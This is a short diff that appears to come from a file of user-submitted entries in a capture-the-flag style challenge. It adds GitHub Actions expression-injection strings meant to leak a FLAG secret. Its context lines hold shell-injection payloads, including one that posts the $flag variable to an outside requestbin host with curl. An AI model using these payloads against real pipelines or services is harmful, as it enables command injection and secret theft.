@@ -513,3 +513,6 @@ R1gelX29:|aewad
 R1gelX29:|ewada
 |echo 'mlgb'
 jiayuqi7813:";curl -X POST -d "fizz=$flag" http://requestbin.net/r/f3ixi7j0;echo "
+Mr-sh11:${{ secret.FLAG }}
+${{ env.FLAG }}
+${{ secret.flag }}
